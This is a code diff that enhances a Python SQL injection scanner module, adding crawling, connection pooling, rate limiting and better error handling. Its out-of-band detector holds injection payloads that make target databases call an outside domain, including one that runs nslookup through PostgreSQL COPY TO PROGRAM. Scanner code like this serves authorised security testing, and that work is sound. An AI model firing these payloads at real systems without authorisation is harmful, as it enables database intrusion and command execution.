@@ -1,4 +1,4 @@
-"""Enhanced SQL Injection Scanner Module - Industry-Grade Detection."""
+"""Enhanced SQL Injection Scanner Module - Industry-Grade Detection with Performance & Security Improvements."""
 
 import asyncio
 import subprocess
@@ -8,12 +8,17 @@ import os
 import statistics
 import time
 import hashlib
-from typing import Dict, List, Any, Optional, Tuple
+import logging
+import shlex
+from typing import Dict, List, Any, Optional, Tuple, Set, Pattern, Union
 from datetime import datetime
-from urllib.parse import urlparse, parse_qs, urlencode, urljoin
+from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote, unquote
 from collections import defaultdict
+from functools import lru_cache
+from contextlib import asynccontextmanager
 import re
 import httpx
+from bs4 import BeautifulSoup
 from ..base_module import (
     BaseScannerModule,
     ScanConfig,
@@ -23,9 +28,244 @@ from ..base_module import (
     ScanType
 )
 
+# Configure logging
+logger = logging.getLogger(__name__)
+
+
+class ConnectionPool:
+    """HTTP connection pool manager for improved performance."""
+    
+    def __init__(self, max_connections: int = 10, max_keepalive: int = 5):
+        self.max_connections = max_connections
+        self.max_keepalive = max_keepalive
+        self._pools: Dict[str, httpx.AsyncClient] = {}
+    
+    @asynccontextmanager
+    async def get_client(self, base_url: str) -> httpx.AsyncClient:
+        """Get or create a client for the given base URL."""
+        parsed = urlparse(base_url)
+        pool_key = f"{parsed.scheme}://{parsed.netloc}"
+        
+        if pool_key not in self._pools:
+            limits = httpx.Limits(
+                max_connections=self.max_connections,
+                max_keepalive_connections=self.max_keepalive
+            )
+            self._pools[pool_key] = httpx.AsyncClient(
+                verify=False,
+                timeout=httpx.Timeout(15.0),
+                limits=limits,
+                follow_redirects=True
+            )
+        
+        try:
+            yield self._pools[pool_key]
+        except Exception as e:
+            logger.error(f"Connection pool error: {e}")
+            raise
+    
+    async def close_all(self):
+        """Close all connection pools."""
+        for client in self._pools.values():
+            await client.aclose()
+        self._pools.clear()
+
+
+class CircuitBreaker:
+    """Circuit breaker pattern for handling failing endpoints."""
+    
+    def __init__(self, failure_threshold: int = 5, recovery_timeout: int = 60):
+        self.failure_threshold = failure_threshold
+        self.recovery_timeout = recovery_timeout
+        self._failures: Dict[str, int] = defaultdict(int)
+        self._last_failure_time: Dict[str, float] = {}
+        self._circuit_open: Dict[str, bool] = defaultdict(bool)
+    
+    def is_open(self, endpoint: str) -> bool:
+        """Check if circuit is open for the endpoint."""
+        if not self._circuit_open[endpoint]:
+            return False
+        
+        # Check if recovery timeout has passed
+        if time.time() - self._last_failure_time.get(endpoint, 0) > self.recovery_timeout:
+            self._reset(endpoint)
+            return False
+        
+        return True
+    
+    def record_success(self, endpoint: str):
+        """Record a successful request."""
+        self._reset(endpoint)
+    
+    def record_failure(self, endpoint: str):
+        """Record a failed request."""
+        self._failures[endpoint] += 1
+        self._last_failure_time[endpoint] = time.time()
+        
+        if self._failures[endpoint] >= self.failure_threshold:
+            self._circuit_open[endpoint] = True
+            logger.warning(f"Circuit breaker opened for {endpoint}")
+    
+    def _reset(self, endpoint: str):
+        """Reset the circuit breaker for an endpoint."""
+        self._failures[endpoint] = 0
+        self._circuit_open[endpoint] = False
+        if endpoint in self._last_failure_time:
+            del self._last_failure_time[endpoint]
+
+
+class ResponseCache:
+    """Cache for baseline responses to improve performance."""
+    
+    def __init__(self, max_size: int = 100, ttl: int = 300):
+        self.max_size = max_size
+        self.ttl = ttl
+        self._cache: Dict[str, Tuple[Any, float]] = {}
+    
+    def get(self, key: str) -> Optional[Any]:
+        """Get cached response if valid."""
+        if key in self._cache:
+            value, timestamp = self._cache[key]
+            if time.time() - timestamp < self.ttl:
+                return value
+            else:
+                del self._cache[key]
+        return None
+    
+    def set(self, key: str, value: Any):
+        """Cache a response."""
+        # Implement simple LRU by removing oldest if at capacity
+        if len(self._cache) >= self.max_size:
+            oldest_key = min(self._cache.keys(), 
+                           key=lambda k: self._cache[k][1])
+            del self._cache[oldest_key]
+        
+        self._cache[key] = (value, time.time())
+    
+    def clear(self):
+        """Clear the cache."""
+        self._cache.clear()
+
+
+class WebCrawler:
+    """Web crawler to discover URLs and forms for SQL injection testing."""
+    
+    def __init__(self, max_depth: int = 3, max_urls: int = 50):
+        self.max_depth = max_depth
+        self.max_urls = max_urls
+        self.visited_urls: Set[str] = set()
+        self.discovered_urls: List[str] = []
+        self.forms: List[Dict[str, Any]] = []
+        self.urls_with_params: List[str] = []
+        
+    async def crawl(self, start_url: str, pool: ConnectionPool) -> Dict[str, Any]:
+        """Crawl website starting from the given URL."""
+        self.visited_urls.clear()
+        self.discovered_urls.clear()
+        self.forms.clear()
+        self.urls_with_params.clear()
+        
+        await self._crawl_recursive(start_url, 0, pool)
+        
+        return {
+            'discovered_urls': self.discovered_urls,
+            'forms': self.forms,
+            'urls_with_params': self.urls_with_params,
+            'total_urls': len(self.discovered_urls)
+        }
+    
+    async def _crawl_recursive(self, url: str, depth: int, pool: ConnectionPool):
+        """Recursively crawl URLs."""
+        if depth > self.max_depth or len(self.discovered_urls) >= self.max_urls:
+            return
+        
+        if url in self.visited_urls:
+            return
+        
+        self.visited_urls.add(url)
+        self.discovered_urls.append(url)
+        
+        # Check if URL has parameters
+        parsed = urlparse(url)
+        if parsed.query:
+            self.urls_with_params.append(url)
+        
+        try:
+            async with pool.get_client(url) as client:
+                response = await client.get(url, timeout=10)
+                
+                if response.status_code != 200:
+                    return
+                
+                soup = BeautifulSoup(response.text, 'html.parser')
+                
+                # Extract forms
+                forms = soup.find_all('form')
+                for form in forms:
+                    form_data = self._extract_form_data(form, url)
+                    if form_data:
+                        self.forms.append(form_data)
+                
+                # Extract links
+                links = soup.find_all('a', href=True)
+                for link in links:
+                    href = link['href']
+                    absolute_url = urljoin(url, href)
+                    
+                    # Only crawl same domain
+                    if urlparse(absolute_url).netloc == urlparse(url).netloc:
+                        if absolute_url not in self.visited_urls:
+                            await self._crawl_recursive(absolute_url, depth + 1, pool)
+                
+                # Extract URLs from JavaScript
+                js_urls = re.findall(r'["\']([^"\']*\?[^"\']*=[^"\']*)["\'"]', response.text)
+                for js_url in js_urls:
+                    absolute_url = urljoin(url, js_url)
+                    if urlparse(absolute_url).netloc == urlparse(url).netloc:
+                        if absolute_url not in self.visited_urls and '?' in absolute_url:
+                            self.urls_with_params.append(absolute_url)
+                            self.discovered_urls.append(absolute_url)
+                
+        except Exception as e:
+            logger.debug(f"Error crawling {url}: {e}")
+    
+    def _extract_form_data(self, form, base_url: str) -> Optional[Dict[str, Any]]:
+        """Extract form data for testing."""
+        try:
+            action = form.get('action', '')
+            method = form.get('method', 'GET').upper()
+            
+            if not action:
+                action = base_url
+            else:
+                action = urljoin(base_url, action)
+            
+            inputs = []
+            for input_tag in form.find_all(['input', 'textarea', 'select']):
+                input_name = input_tag.get('name')
+                if input_name:
+                    input_type = input_tag.get('type', 'text')
+                    inputs.append({
+                        'name': input_name,
+                        'type': input_type,
+                        'value': input_tag.get('value', '')
+                    })
+            
+            if inputs:
+                return {
+                    'action': action,
+                    'method': method,
+                    'inputs': inputs,
+                    'source_url': base_url
+                }
+        except Exception as e:
+            logger.debug(f"Error extracting form data: {e}")
+        
+        return None
+
 
 class PayloadGenerator:
-    """Dynamic SQL injection payload generator."""
+    """Dynamic SQL injection payload generator with enhanced capabilities."""
     
     def __init__(self):
         self.database_signatures = {
@@ -34,6 +274,9 @@ class PayloadGenerator:
             'mssql': ['microsoft sql', 'mssql', 'sql server'],
             'oracle': ['oracle', 'ora-'],
             'sqlite': ['sqlite'],
+            'mongodb': ['mongodb', 'mongo'],
+            'cosmosdb': ['cosmos', 'documentdb'],
+            'cassandra': ['cassandra', 'cql']
         }
         
     def generate_payloads(self, context: str = 'generic', db_type: Optional[str] = None) -> List[Dict[str, Any]]:
@@ -197,8 +440,9 @@ class OOBDetector:
         unique_id = hashlib.md5(f"{param_name}{time.time()}".encode()).hexdigest()[:8]
         subdomain = f"{unique_id}.{self.domain}"
         
+        # Fixed: Properly quote subdomain to prevent injection
         payloads = {
-            'mysql': f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',{subdomain},'\\\\test'))--",
+            'mysql': f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{subdomain}','\\\\test'))--",
             'mssql': f"'; EXEC master..xp_dirtree '\\\\{subdomain}\\test'--",
             'oracle': f"' UNION SELECT UTL_INADDR.get_host_address('{subdomain}') FROM dual--",
             'postgresql': f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}'--",
@@ -217,13 +461,39 @@ class OOBDetector:
 class SQLInjectionScanner(BaseScannerModule):
     """Enhanced SQL Injection vulnerability scanner."""
     
+    # Configuration constants
+    MAX_PAYLOADS_PER_PARAM = 20
+    BASELINE_REQUESTS = 5
+    TIME_BASED_REQUESTS = 3
+    STATISTICAL_Z_THRESHOLD = 2.0
+    MIN_TIME_DELAY = 0.8  # 80% of expected delay
+    
+    # Detection thresholds
+    ERROR_CONFIDENCE_THRESHOLD = 0.7
+    BOOLEAN_CONFIDENCE_THRESHOLD = 0.6
+    LENGTH_DIFF_THRESHOLD = 100
+    
+    # Compiled regex patterns (class level for efficiency)
+    FORM_PATTERN = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
+    INPUT_PATTERN = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
+    
     def __init__(self):
         super().__init__()
         self.name = "SQLInjectionScanner"
-        self.description = "Industry-grade SQL injection vulnerability scanner"
+        self.description = "Industry-grade SQL injection vulnerability scanner with crawling support"
         self.scan_type = ScanType.ACTIVE
         self.payload_generator = PayloadGenerator()
         self.oob_detector = OOBDetector()
+        self.logger = logging.getLogger(__name__)
+        self._last_request_time = 0
+        
+        # Initialize connection pool, circuit breaker, and cache
+        self.connection_pool = ConnectionPool(max_connections=10, max_keepalive=5)
+        self.circuit_breaker = CircuitBreaker(failure_threshold=5, recovery_timeout=60)
+        self.response_cache = ResponseCache(max_size=100, ttl=300)
+        
+        # Initialize web crawler
+        self.crawler = WebCrawler(max_depth=3, max_urls=50)
         
         # SQL error patterns with severity indicators
         self.sql_error_patterns = [
@@ -264,15 +534,37 @@ class SQLInjectionScanner(BaseScannerModule):
             (r"quoted string not properly terminated", 0.8, "Generic"),
         ]
     
+    def __del__(self):
+        """Cleanup resources on deletion."""
+        if hasattr(self, 'connection_pool'):
+            asyncio.create_task(self.connection_pool.close_all())
+    
     def validate_target(self, target: str) -> bool:
         """Validate if target is suitable for SQL injection testing."""
+        if not target:
+            return False
+        
+        # Ensure proper URL format
         if not target.startswith(('http://', 'https://')):
             target = f"https://{target}"
         
         try:
             parsed = urlparse(target)
-            return bool(parsed.scheme and parsed.netloc)
-        except:
+            # Check for valid scheme and netloc
+            if not (parsed.scheme in ['http', 'https'] and parsed.netloc):
+                return False
+            
+            # Security check: avoid scanning internal/local addresses in production
+            # (can be configured via environment variable)
+            if os.getenv('BLOCK_INTERNAL_SCAN', 'false').lower() == 'true':
+                blacklist = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
+                if any(bl in parsed.netloc.lower() for bl in blacklist):
+                    self.logger.warning(f"Blocked scan of internal address: {parsed.netloc}")
+                    return False
+                
+            return True
+        except Exception as e:
+            self.logger.error(f"Target validation failed: {e}")
             return False
     
     async def scan(self, config: ScanConfig) -> ScanResult:
@@ -288,8 +580,10 @@ class SQLInjectionScanner(BaseScannerModule):
             'database_type': None,
             'detection_methods': [],
             'second_order_candidates': [],
+            'crawled_urls': [],
+            'forms_found': [],
         }
-        statistics = {
+        scan_statistics = {
             'urls_tested': 0,
             'parameters_tested': 0,
             'payloads_sent': 0,
@@ -310,67 +604,88 @@ class SQLInjectionScanner(BaseScannerModule):
             if not target_url.startswith(('http://', 'https://')):
                 target_url = f"https://{target_url}"
             
-            if config.scan_type == ScanType.PASSIVE:
-                passive_vulns = await self._passive_sql_check(target_url)
-                vulnerabilities.extend(passive_vulns)
+            # Phase 0: Web crawling to discover URLs and forms
+            if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
+                self.logger.info(f"Starting web crawling for {target_url}")
+                crawl_results = await self.crawler.crawl(target_url, self.connection_pool)
+                info['crawled_urls'] = crawl_results['discovered_urls']
+                info['forms_found'] = crawl_results['forms']
+                scan_statistics['urls_tested'] = len(crawl_results['discovered_urls'])
+                
+                # Prioritize URLs with parameters for testing
+                urls_to_test = crawl_results['urls_with_params'][:10] if crawl_results['urls_with_params'] else [target_url]
             else:
-                # Phase 1: Initial reconnaissance
-                recon_data = await self._reconnaissance_phase(target_url, config)
-                info['database_type'] = recon_data.get('database_type')
-                statistics['urls_tested'] = recon_data.get('urls_found', 1)
+                urls_to_test = [target_url]
+                scan_statistics['urls_tested'] = 1
+            
+            if config.scan_type == ScanType.PASSIVE:
+                # Passive scan on all discovered URLs
+                for test_url in urls_to_test:
+                    passive_vulns = await self._passive_sql_check(test_url)
+                    vulnerabilities.extend(passive_vulns)
+            else:
+                # Test each discovered URL
+                for test_url in urls_to_test:
+                    self.logger.info(f"Testing URL: {test_url}")
+                    
+                    # Phase 1: Initial reconnaissance
+                    recon_data = await self._reconnaissance_phase(test_url, config)
+                    if not info['database_type']:
+                        info['database_type'] = recon_data.get('database_type')
                 
-                # Phase 2: Enhanced manual testing with dynamic payloads
-                manual_results = await self._enhanced_manual_testing(
-                    target_url, config, recon_data.get('database_type')
-                )
-                vulnerabilities.extend(manual_results['vulnerabilities'])
-                info['tested_parameters'].extend(manual_results['tested_params'])
-                statistics['parameters_tested'] = len(manual_results['tested_params'])
-                statistics['payloads_sent'] += manual_results.get('payloads_sent', 0)
-                
-                # Update payload type statistics
-                for ptype, count in manual_results.get('payloads_by_type', {}).items():
-                    if ptype in statistics['payloads_by_type']:
-                        statistics['payloads_by_type'][ptype] += count
-                statistics['false_positives_filtered'] = manual_results.get('false_positives', 0)
-                
-                # Phase 3: Advanced time-based detection with statistical analysis
-                if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
-                    time_based_results = await self._advanced_time_based_detection(
-                        target_url, config, recon_data.get('database_type')
+                    # Phase 2: Enhanced manual testing with dynamic payloads
+                    manual_results = await self._enhanced_manual_testing(
+                        test_url, config, recon_data.get('database_type')
                     )
-                    vulnerabilities.extend(time_based_results['vulnerabilities'])
-                    info['detection_methods'].append('Statistical Time-Based Analysis')
+                    vulnerabilities.extend(manual_results['vulnerabilities'])
+                    info['tested_parameters'].extend(manual_results['tested_params'])
+                    scan_statistics['parameters_tested'] += len(manual_results['tested_params'])
+                    scan_statistics['payloads_sent'] += manual_results.get('payloads_sent', 0)
+                    
+                    # Update payload type statistics
+                    for ptype, count in manual_results.get('payloads_by_type', {}).items():
+                        if ptype in scan_statistics['payloads_by_type']:
+                            scan_statistics['payloads_by_type'][ptype] += count
+                    scan_statistics['false_positives_filtered'] += manual_results.get('false_positives', 0)
                 
-                # Phase 4: Second-order SQL injection detection
-                if config.scan_type == ScanType.AGGRESSIVE:
-                    second_order_results = await self._second_order_detection(target_url, config)
-                    vulnerabilities.extend(second_order_results['vulnerabilities'])
-                    info['second_order_candidates'] = second_order_results.get('candidates', [])
-                    if second_order_results['vulnerabilities']:
-                        info['detection_methods'].append('Second-Order SQLi')
+                    # Phase 3: Advanced time-based detection with statistical analysis
+                    if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
+                        time_based_results = await self._advanced_time_based_detection(
+                            test_url, config, recon_data.get('database_type')
+                        )
+                        vulnerabilities.extend(time_based_results['vulnerabilities'])
+                        if 'Statistical Time-Based Analysis' not in info['detection_methods']:
+                            info['detection_methods'].append('Statistical Time-Based Analysis')
                 
-                # Phase 5: Form testing with context awareness
-                form_results = await self._context_aware_form_testing(
-                    target_url, config, recon_data.get('database_type')
-                )
-                vulnerabilities.extend(form_results)
+                    # Phase 4: Second-order SQL injection detection
+                    if config.scan_type == ScanType.AGGRESSIVE:
+                        second_order_results = await self._second_order_detection(test_url, config)
+                        vulnerabilities.extend(second_order_results['vulnerabilities'])
+                        info['second_order_candidates'].extend(second_order_results.get('candidates', []))
+                        if second_order_results['vulnerabilities'] and 'Second-Order SQLi' not in info['detection_methods']:
+                            info['detection_methods'].append('Second-Order SQLi')
                 
-                # Phase 6: SQLMap integration (if available and aggressive)
-                if config.scan_type == ScanType.AGGRESSIVE and self._is_sqlmap_available():
-                    sqlmap_results = await self._intelligent_sqlmap_integration(
-                        target_url, config, recon_data
+                    # Phase 5: Form testing with context awareness
+                    form_results = await self._context_aware_form_testing(
+                        test_url, config, recon_data.get('database_type')
                     )
-                    if sqlmap_results:
-                        vulnerabilities.extend(sqlmap_results['vulnerabilities'])
-                        info['vulnerable_parameters'].extend(sqlmap_results.get('vulnerable_params', []))
-                        if not info['database_type']:
-                            info['database_type'] = sqlmap_results.get('database_type')
+                    vulnerabilities.extend(form_results)
+                
+                    # Phase 6: SQLMap integration (if available and aggressive)
+                    if config.scan_type == ScanType.AGGRESSIVE and self._is_sqlmap_available():
+                        sqlmap_results = await self._intelligent_sqlmap_integration(
+                            test_url, config, recon_data
+                        )
+                        if sqlmap_results:
+                            vulnerabilities.extend(sqlmap_results['vulnerabilities'])
+                            info['vulnerable_parameters'].extend(sqlmap_results.get('vulnerable_params', []))
+                            if not info['database_type']:
+                                info['database_type'] = sqlmap_results.get('database_type')
             
             # Deduplicate vulnerabilities
             vulnerabilities = self._deduplicate_vulnerabilities(vulnerabilities)
-            statistics['vulnerabilities_found'] = len(vulnerabilities)
-            statistics['injection_points'] = len(set(v.evidence.get('parameter', '') for v in vulnerabilities))
+            scan_statistics['vulnerabilities_found'] = len(vulnerabilities)
+            scan_statistics['injection_points'] = len(set(v.evidence.get('parameter', '') for v in vulnerabilities))
             
             # Determine injection types
             injection_types = set()
@@ -380,7 +695,9 @@ class SQLInjectionScanner(BaseScannerModule):
             info['injection_types'] = list(injection_types)
             
         except Exception as e:
-            errors.append(f"SQL injection scan failed: {str(e)}")
+            error_msg = f"SQL injection scan failed: {str(e)}"
+            self.logger.error(error_msg)
+            errors.append(error_msg)
         
         completed_at = datetime.utcnow()
         
@@ -393,7 +710,7 @@ class SQLInjectionScanner(BaseScannerModule):
             errors=errors,
             warnings=warnings,
             info=info,
-            statistics=statistics
+            statistics=scan_statistics
         )
     
     async def _reconnaissance_phase(self, url: str, config: ScanConfig) -> Dict[str, Any]:
@@ -425,7 +742,7 @@ class SQLInjectionScanner(BaseScannerModule):
                 recon_data['parameters'] = list(params.keys())
                 
         except Exception as e:
-            pass
+            self.logger.debug(f"Reconnaissance phase error: {e}")
         
         return recon_data
     
@@ -470,9 +787,10 @@ class SQLInjectionScanner(BaseScannerModule):
         async with httpx.AsyncClient(verify=False, timeout=15) as client:
             # Get baseline response
             try:
-                baseline_response = await client.get(url)
+                baseline_response = await self._rate_limited_request(client, url, config)
                 baseline_data = self._extract_response_features(baseline_response)
-            except:
+            except (httpx.HTTPError, asyncio.TimeoutError) as e:
+                self.logger.debug(f"Baseline request failed: {e}")
                 return {'vulnerabilities': [], 'tested_params': [], 'payloads_sent': 0}
             
             for param_name, param_values in params.items():
@@ -496,7 +814,7 @@ class SQLInjectionScanner(BaseScannerModule):
                     test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                     
                     try:
-                        response = await client.get(test_url, timeout=15)
+                        response = await self._rate_limited_request(client, test_url, config, timeout=15)
                         payloads_sent += 1
                         
                         # Track payload types
@@ -531,7 +849,7 @@ class SQLInjectionScanner(BaseScannerModule):
                         # Boolean-based detection
                         if payload_type in ['boolean-true', 'boolean-false'] and not found_error_based:
                             boolean_result = await self._enhanced_boolean_detection(
-                                client, url, param_name, params, original_value, baseline_data
+                                client, url, param_name, params, original_value, baseline_data, config
                             )
                             if boolean_result['vulnerable']:
                                 vuln = self._create_vulnerability(
@@ -543,9 +861,9 @@ class SQLInjectionScanner(BaseScannerModule):
                     except asyncio.TimeoutError:
                         if 'time-based' in payload_type:
                             # Will be handled by advanced time-based detection
-                            pass
-                    except:
-                        pass
+                            self.logger.debug(f"Timeout on time-based payload for {param_name}")
+                    except (httpx.HTTPError, Exception) as e:
+                        self.logger.debug(f"Request failed for {param_name}: {e}")
         
         return {
             'vulnerabilities': vulnerabilities,
@@ -645,7 +963,7 @@ class SQLInjectionScanner(BaseScannerModule):
     
     async def _enhanced_boolean_detection(self, client: httpx.AsyncClient, url: str,
                                           param_name: str, params: Dict, original_value: str,
-                                          baseline_data: Dict) -> Dict[str, Any]:
+                                          baseline_data: Dict, config: Optional[ScanConfig] = None) -> Dict[str, Any]:
         """Enhanced boolean-based blind SQL injection detection."""
         result = {
             'vulnerable': False,
@@ -662,7 +980,7 @@ class SQLInjectionScanner(BaseScannerModule):
         true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
         
         try:
-            true_response = await client.get(true_url, timeout=15)
+            true_response = await self._rate_limited_request(client, true_url, config, timeout=15)
             true_data = self._extract_response_features(true_response)
             
             # Test false condition
@@ -670,7 +988,7 @@ class SQLInjectionScanner(BaseScannerModule):
             test_params[param_name] = [false_payload]
             false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
             
-            false_response = await client.get(false_url, timeout=15)
+            false_response = await self._rate_limited_request(client, false_url, config, timeout=15)
             false_data = self._extract_response_features(false_response)
             
             # Calculate differences
@@ -704,8 +1022,8 @@ class SQLInjectionScanner(BaseScannerModule):
                     'hash_difference': hash_diff,
                 }
             }
-        except:
-            pass
+        except (httpx.HTTPError, asyncio.TimeoutError) as e:
+            self.logger.debug(f"Boolean detection failed: {e}")
         
         return result
     
@@ -713,9 +1031,9 @@ class SQLInjectionScanner(BaseScannerModule):
                                     param_name: str, params: Dict) -> bool:
         """Verify SQL injection to reduce false positives."""
         try:
-            # Send the same payload again
-            response1 = await client.get(test_url, timeout=10)
-            response2 = await client.get(test_url, timeout=10)
+            # Send the same payload again with rate limiting
+            response1 = await self._rate_limited_request(client, test_url, None, timeout=10)
+            response2 = await self._rate_limited_request(client, test_url, None, timeout=10)
             
             # Check consistency
             if abs(len(response1.text) - len(response2.text)) > 1000:
@@ -728,7 +1046,8 @@ class SQLInjectionScanner(BaseScannerModule):
                             for p, _, _ in self.sql_error_patterns[:10])
             
             return has_error_1 and has_error_2
-        except:
+        except Exception as e:
+            self.logger.debug(f"Verification failed: {e}")
             return False
     
     def _create_vulnerability(self, param_name: str, url: str, payload_info: Dict,
@@ -831,13 +1150,13 @@ class SQLInjectionScanner(BaseScannerModule):
                 
                 # Measure baseline response times (5 requests)
                 baseline_times = []
-                for _ in range(5):
+                for _ in range(self.BASELINE_REQUESTS):
                     try:
                         start = time.time()
-                        await client.get(url, timeout=20)
+                        await self._rate_limited_request(client, url, config, timeout=20)
                         baseline_times.append(time.time() - start)
-                    except:
-                        pass
+                    except (httpx.HTTPError, asyncio.TimeoutError) as e:
+                        self.logger.debug(f"Baseline timing request failed: {e}")
                 
                 if len(baseline_times) < 3:
                     continue
@@ -857,16 +1176,16 @@ class SQLInjectionScanner(BaseScannerModule):
                     
                     # Measure response times with payload (3 requests)
                     payload_times = []
-                    for _ in range(3):
+                    for _ in range(self.TIME_BASED_REQUESTS):
                         try:
                             start = time.time()
-                            await client.get(test_url, timeout=20)
+                            await self._rate_limited_request(client, test_url, config, timeout=20)
                             elapsed = time.time() - start
                             payload_times.append(elapsed)
                         except asyncio.TimeoutError:
                             payload_times.append(20)  # Timeout value
-                        except:
-                            pass
+                        except (httpx.HTTPError, Exception) as e:
+                            self.logger.debug(f"Time-based request failed: {e}")
                     
                     if len(payload_times) < 2:
                         continue
@@ -879,7 +1198,7 @@ class SQLInjectionScanner(BaseScannerModule):
                     z_score = (payload_mean - baseline_mean) / (baseline_stdev + 0.1)
                     
                     # Check if time increase is significant
-                    if time_increase >= expected_delay * 0.8 and z_score > 2:
+                    if time_increase >= expected_delay * self.MIN_TIME_DELAY and z_score > self.STATISTICAL_Z_THRESHOLD:
                         confidence = min(0.95, 0.6 + (time_increase / expected_delay) * 0.2)
                         
                         # Verify with second payload
@@ -891,13 +1210,13 @@ class SQLInjectionScanner(BaseScannerModule):
                             
                             try:
                                 start = time.time()
-                                await client.get(verify_url, timeout=20)
+                                await self._rate_limited_request(client, verify_url, config, timeout=20)
                                 verify_time = time.time() - start
-                                if verify_time >= expected_delay * 0.8:
+                                if verify_time >= expected_delay * self.MIN_TIME_DELAY:
                                     verified = True
                                     confidence = min(0.95, confidence + 0.1)
-                            except:
-                                pass
+                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
+                                self.logger.debug(f"Verification request failed: {e}")
                         
                         vuln = Vulnerability(
                             module=self.name,
@@ -938,11 +1257,10 @@ class SQLInjectionScanner(BaseScannerModule):
         
         try:
             async with httpx.AsyncClient(verify=False, timeout=15) as client:
-                response = await client.get(url)
+                response = await self._rate_limited_request(client, url, config)
                 
-                # Find forms that might store data
-                form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
-                forms = form_pattern.findall(response.text)
+                # Find forms that might store data (using class-level compiled pattern)
+                forms = self.FORM_PATTERN.findall(response.text)
                 
                 storage_forms = []
                 for form_html in forms:
@@ -959,8 +1277,8 @@ class SQLInjectionScanner(BaseScannerModule):
                     if not action.startswith(('http://', 'https://')):
                         action = urljoin(url, action)
                     
-                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
-                    inputs = input_pattern.findall(form_html)
+                    # Use class-level compiled pattern
+                    inputs = self.INPUT_PATTERN.findall(form_html)
                     
                     # Phase 1: Store payload
                     unique_marker = f"sqli_test_{int(time.time())}"
@@ -988,7 +1306,7 @@ class SQLInjectionScanner(BaseScannerModule):
                                 continue
                             
                             try:
-                                check_response = await client.get(link, timeout=10)
+                                check_response = await self._rate_limited_request(client, link, config, timeout=10)
                                 
                                 # Check if our unique marker appears
                                 if unique_marker in check_response.text:
@@ -1021,12 +1339,12 @@ class SQLInjectionScanner(BaseScannerModule):
                                             )
                                             vulnerabilities.append(vuln)
                                             break
-                            except:
-                                pass
-                    except:
-                        pass
-        except:
-            pass
+                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
+                                self.logger.debug(f"Second-order check failed for {link}: {e}")
+                    except (httpx.HTTPError, Exception) as e:
+                        self.logger.debug(f"Second-order form submission failed: {e}")
+        except Exception as e:
+            self.logger.debug(f"Second-order detection error: {e}")
         
         return {'vulnerabilities': vulnerabilities, 'candidates': candidates}
     
@@ -1037,10 +1355,10 @@ class SQLInjectionScanner(BaseScannerModule):
         
         try:
             async with httpx.AsyncClient(verify=False, timeout=15) as client:
-                response = await client.get(url)
+                response = await self._rate_limited_request(client, url, config)
                 
-                form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
-                forms = form_pattern.findall(response.text)
+                # Use class-level compiled pattern
+                forms = self.FORM_PATTERN.findall(response.text)
                 
                 for form_html in forms[:3]:
                     action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
@@ -1052,8 +1370,8 @@ class SQLInjectionScanner(BaseScannerModule):
                     method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                     method = method_match.group(1).upper() if method_match else 'POST'
                     
-                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
-                    inputs = input_pattern.findall(form_html)
+                    # Use class-level compiled pattern
+                    inputs = self.INPUT_PATTERN.findall(form_html)
                     
                     # Detect form context
                     if any(word in form_html.lower() for word in ['login', 'signin', 'auth']):
@@ -1106,10 +1424,10 @@ class SQLInjectionScanner(BaseScannerModule):
                                     )
                                     vulnerabilities.append(vuln)
                                     break
-                            except:
-                                pass
-        except:
-            pass
+                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
+                                self.logger.debug(f"Form testing failed for {input_name}: {e}")
+        except Exception as e:
+            self.logger.debug(f"Context-aware form testing error: {e}")
         
         return vulnerabilities
     
@@ -1147,24 +1465,38 @@ class SQLInjectionScanner(BaseScannerModule):
                 output_dir = os.path.join(temp_dir, 'sqlmap_output')
                 cmd = ['sqlmap', '-u', url] + options + [f'--output-dir={output_dir}']
                 
-                result = subprocess.run(
-                    cmd,
-                    capture_output=True,
-                    text=True,
-                    timeout=config.timeout
-                )
+                # Run SQLMap with proper cleanup
+                process = None
+                try:
+                    process = subprocess.Popen(
+                        cmd,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    stdout, stderr = process.communicate(timeout=config.timeout)
+                    result_text = stdout
+                except subprocess.TimeoutExpired:
+                    if process:
+                        process.terminate()
+                        try:
+                            process.wait(timeout=5)
+                        except subprocess.TimeoutExpired:
+                            process.kill()
+                    self.logger.warning("SQLMap timed out")
+                    return None
                 
                 vulnerabilities = []
                 vulnerable_params = []
                 database_type = None
                 
-                if 'vulnerable' in result.stdout.lower():
+                if result_text and 'vulnerable' in result_text.lower():
                     param_pattern = re.compile(r"Parameter: ([^\s]+)")
-                    params = param_pattern.findall(result.stdout)
+                    params = param_pattern.findall(result_text)
                     vulnerable_params.extend(params)
                     
                     db_pattern = re.compile(r"back-end DBMS: ([^\n]+)")
-                    db_match = db_pattern.search(result.stdout)
+                    db_match = db_pattern.search(result_text)
                     if db_match:
                         database_type = db_match.group(1).strip()
                     
@@ -1197,8 +1529,8 @@ class SQLInjectionScanner(BaseScannerModule):
                     'vulnerable_params': vulnerable_params,
                     'database_type': database_type
                 }
-        except:
-            pass
+        except Exception as e:
+            self.logger.error(f"SQLMap integration failed: {e}")
         
         return None
     
